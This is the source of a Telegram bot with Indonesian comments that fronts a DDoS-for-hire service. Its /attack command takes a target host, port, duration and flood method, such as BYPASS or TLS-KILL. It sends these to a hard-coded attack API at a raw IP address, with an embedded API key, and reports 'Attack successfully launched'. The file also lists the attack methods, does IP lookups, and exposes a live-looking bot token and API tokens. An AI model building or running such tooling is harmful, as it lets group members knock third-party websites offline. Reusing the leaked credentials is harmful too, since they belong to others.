import logging
import requests
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ID grup yang diizinkan (ganti dengan ID grup Anda)
ALLOWED_CHAT_ID = -1002456492650

# Link grup yang diperlukan pengguna untuk bergabung
GROUP_JOIN_LINK = "https://t.me/veccychat"

# Konfigurasi logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# Fungsi untuk memeriksa apakah user sudah bergabung di grup yang benar
async def check_user_in_allowed_group(update: Update) -> bool:
    # Periksa apakah pesan berasal dari grup yang diizinkan
    if update.message.chat.id != ALLOWED_CHAT_ID:
        return False
    return True

# Fungsi untuk menangani command /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Periksa apakah pengguna berada di grup yang diizinkan
    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(
            f"⚠️ Oops! Access Denied!\n\n"
            f"You can only use this command in the official group:\n"
            f"👉 {GROUP_JOIN_LINK}\n\n"
            f"👉 Please join the group first and try again!\n"
            f"We look forward to seeing you there! 😎"
        )
        return

    # Membuat keyboard kustom dengan desain yang lebih ringkas
    keyboard = [
        ['/attack', '/scan'],  # Mengurangi jumlah tombol per baris
        ['/methods']
    ]
    
    # Menggunakan ReplyKeyboardMarkup untuk menampilkan keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)  # Menambahkan opsi resize keyboard
    
    # Mengirim pesan dengan custom keyboard
    await update.message.reply_text(
        "Hello! 👋\nChoose an option below to get started 🧑‍💻:",
        reply_markup=reply_markup
    )

# Fungsi untuk menangani command /attack
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Periksa apakah pengguna berada di grup yang diizinkan
    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(
            f"⚠️ Oops! Access Denied!\n\n"
            f"You can only use this command in the official group:\n"
            f"👉{GROUP_JOIN_LINK}\n\n"
            f"👉 Please join the group first and try again!\n"
            f"We look forward to seeing you there! 😎"
        )
        return

    # Cek apakah pengguna mengirimkan parameter
    if len(context.args) == 0:
        # Jika tidak ada parameter, beri tahu cara penggunaan /attack
        await update.message.reply_text(
            "🔔 How to use /attack:\n\n"
            "/attack <host> <port> <time> <method>\n\n"
            "📌 Example:\n"
            "/attack https://example.com 443 60 BYPASS\n\n"
            "Make sure you provide all required parameters for a successful attack! 💥"
        )
        return

    # Memastikan pengguna memberikan parameter yang benar
    if len(context.args) != 4:
        await update.message.reply_text(
            "⚠️ Invalid format! Please use: /attack <host> <port> <time> <method>\n\n"
            "📌 Example: /attack https://example.com 443 60 BYPASS"
        )
        return
    
    host = context.args[0]
    port = context.args[1]
    time = context.args[2]
    method = context.args[3]

    # URL API untuk /attack
    api_url = f"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host={host}&port={port}&time={time}&method={method}"

    # Menambahkan log untuk memeriksa URL API yang dibentuk
    logging.info(f"Calling API with URL: {api_url}")

    # Mengirim permintaan ke API
    try:
        response = requests.get(api_url)

        # Menambahkan log untuk memeriksa status respons API
        logging.info(f"API Response: {response.status_code} - {response.text}")

        # Menangani respons API
        if response.status_code == 200:
            await update.message.reply_text(
                f"🎯 Attack successfully launched!\n\n"
                f"💥 Target: {host}:{port}\n"
                f"⏳ Duration: {time} seconds\n"
                f"⚡ Method: {method}\n\n"
                f"✅ API Response: {response.text}\n\n"
                "Attack complete. Check the results! 💻"
            )
        else:
            # Jika API memberi respons dengan error
            await update.message.reply_text(
                f"❌ Error: {response.text}\n\n"
                "Something went wrong. Please check the parameters and try again! 🛠️"
            )
    except requests.RequestException as e:
        logging.error(f"Error accessing API: {e}")
        await update.message.reply_text("⚠️ Error: There was an issue connecting to the API. Please try again later! 🌐")

# Fungsi untuk menangani command /methods
async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Periksa apakah pengguna berada di grup yang diizinkan
    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(
            f"⚠️ Oops! Access Denied!\n\n"
            f"You can only use this command in the official group:\n"
            f"👉{GROUP_JOIN_LINK}\n\n"
            f"👉 Please join the group first and try again!\n"
            f"We look forward to seeing you there! 😎"
        )
        return
    
    available_methods = """
    🔎 Available Methods:
    1. BYPASS
    2. BYPASSV2
    3. DEATH
    5. TLS-KILL
    6. STORM
    7. POWER
    8. MIX
    
Choose a method for your attack!
    """
    await update.message.reply_text(available_methods)

# Fungsi untuk menangani command /scan dengan format /scan host
async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Periksa apakah pengguna berada di grup yang diizinkan
    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(
            f"⚠️ Oops! Access Denied!\n\n"
            f"You can only use this command in the official group:\n"
            f"👉{GROUP_JOIN_LINK}\n\n"
            f"👉 Please join the group first and try again!\n"
            f"We look forward to seeing you there! 😎"
        )
        return

    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Invalid format! Use:\n/scan <host>\nExample: /scan 1.1.1.1")
        return
    
    host = context.args[0]
    
    try:
        # Mengambil informasi IP menggunakan API ipinfo.io
        ip_info_url = f"http://ipinfo.io/{host}/json?token=52a6a96eecd131"
        response = requests.get(ip_info_url)

        if response.status_code == 200:
            ip_info = response.json()
            ip_data = f"📡 IP Information for {host}:\n" \
                      f"💻 IP: {ip_info.get('ip')}\n" \
                      f"🌍 Location: {ip_info.get('city')}, {ip_info.get('region')}, {ip_info.get('country')}\n" \
                      f"🏢 Org: {ip_info.get('org')}"
            await update.message.reply_text(ip_data)
        else:
            await update.message.reply_text(f"❌ Failed to fetch IP info.\nPlease try again later.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")

# Fungsi utama untuk menjalankan bot
def main():
    BOT_TOKEN = "7500966509:AAGByZ44gAoxvDjYGuIdmfoO8U-mebyAeCI"  # Token bot Telegram Anda

    # Membuat aplikasi bot
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Menambahkan handler untuk command /start
    application.add_handler(CommandHandler("start", start))

    # Menambahkan handler untuk command /attack
    application.add_handler(CommandHandler("attack", attack_command))

    # Menambahkan handler untuk command /methods
    application.add_handler(CommandHandler("methods", methods_command))

    # Menambahkan handler untuk command /scan
    application.add_handler(CommandHandler("scan", scan_command))

    # Menjalankan bot dengan polling
    application.run_polling()

# Menjalankan fungsi utama
if __name__ == "__main__":
    main()